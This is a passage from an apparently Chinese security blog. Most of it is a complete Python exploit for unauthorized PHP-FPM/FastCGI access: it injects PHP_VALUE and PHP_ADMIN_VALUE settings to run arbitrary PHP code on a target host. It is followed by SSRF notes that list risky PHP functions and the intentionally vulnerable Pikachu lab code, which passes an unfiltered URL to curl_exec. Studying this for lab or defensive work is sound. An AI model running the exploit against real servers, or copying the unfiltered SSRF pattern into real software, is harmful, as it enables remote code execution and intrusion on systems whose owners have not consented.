+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bchr</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bord</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(c, <span class="built_in">int</span>):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force_bytes</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force_text</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">issubclass</span>(<span class="built_in">type</span>(s), <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">str</span>(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FastCGIClient</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = <span class="built_in">dict</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__connect</span>(<span class="params">self</span>):</span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, <span class="built_in">int</span>(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">repr</span>(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span><br><span class="line">        length = <span class="built_in">len</span>(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">              + bchr(fcgi_type) \</span><br><span class="line">              + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">              + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">              + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">              + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">              + bchr(<span class="number">0</span>) \</span><br><span class="line">              + bchr(<span class="number">0</span>) \</span><br><span class="line">              + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span><br><span class="line">        nLen = <span class="built_in">len</span>(name)</span><br><span class="line">        vLen = <span class="built_in">len</span>(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span><br><span class="line">        header = <span class="built_in">dict</span>()</span><br><span class="line">        header[<span class="string">&#x27;version&#x27;</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">&#x27;type&#x27;</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span><br><span class="line">        header = buffer.read(<span class="built_in">int</span>(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = <span class="built_in">int</span>(record[<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record[<span class="string">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(<span class="built_in">int</span>(record[<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = <span class="built_in">dict</span>()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        self.sock.send(request)</span><br><span class="line">        self.requests[requestId][<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class="line">        self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.__waitForResponse(requestId)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__waitForResponse</span>(<span class="params">self, requestId</span>):</span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == <span class="built_in">int</span>(response[<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] += response[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;host&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;FastCGI port&#x27;</span>, default=<span class="number">9000</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = <span class="built_in">dict</span>()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;12345&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % <span class="built_in">len</span>(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    <span class="built_in">print</span>(force_text(response))</span><br></pre></td></tr></table></figure>
+<p>又是参考 P 师傅的一天～</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vZmFzdGNnaS1hbmQtcGhwLWZwbS5odG1s">Fastcgi 协议分析 &amp;&amp; PHP-FPM 未授权访问漏洞 &amp;&amp; Exp 编写 | 离别歌 (leavesongs.com)</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RhcnVua2FudC9Hb3BoZXJ1cw==">tarunkant/Gopherus: This tool generates gopher link for exploiting SSRF and gaining RCE in various servers (github.com)</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3VuZXhwZWN0ZWR0aGluZy9hcnRpY2xlL2RldGFpbHMvMTIxNjQzMDAy">SSRF–gopher 协议打 FastCGI_Z3eyOnd 的博客 - CSDN 博客_gopher fastcgi</span></p>
+<h3 id="ssrf-2"><a class="markdownIt-Anchor" href="#ssrf-2">#</a> SSRF</h3>
+<blockquote>
+<p><strong>SSRF (Server-Side Request Forgery: 服务器端请求伪造)</strong></p>
+<p>其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>，但又没有对目标地址做严格过滤与限制</p>
+<p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据</p>
+<p>数据流：攻击者 -----&gt; 服务器 ----&gt; 目标地址</p>
+<p>根据后台使用的函数的不同，对应的影响和利用方法又有不一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br><span class="line">         </span><br></pre></td></tr></table></figure>
+<p>但注意 curl_exec () 不支持 php://filter 等伪协议，支持 dict</p>
+<p>但 file_get_contens () 支持 php://filter 伪协议读文件，不支持 dict</p>
+<p>如果一定要通过后台服务器远程去对用户指定 (“或者预埋在前端的请求”) 的地址进行资源请求，<strong> 则请做好目标地址的过滤</strong>。</p>
+</blockquote>
+<h4 id="pikachu-curl-ssrf"><a class="markdownIt-Anchor" href="#pikachu-curl-ssrf">#</a> pikachu - curl ssrf</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]) &amp;&amp; $_GET[&#x27;url&#x27;] != null)&#123;</span><br><span class="line"></span><br><span class="line">    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span><br><span class="line">    $URL = $_GET[&#x27;url&#x27;];</span><br><span class="line">    $CH = curl_init($URL);</span><br><span class="line">    curl_setopt($CH, CURLOPT_HEADER, FALSE);</span><br><span class="line">    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);</span><br><span class="line">    $RES = curl_exec($CH);</span><br><span class="line">    curl_close($CH) ;</span><br><span class="line">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。</span><br><span class="line">//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet</span><br><span class="line">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP</span><br><span class="line">    echo $RES;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
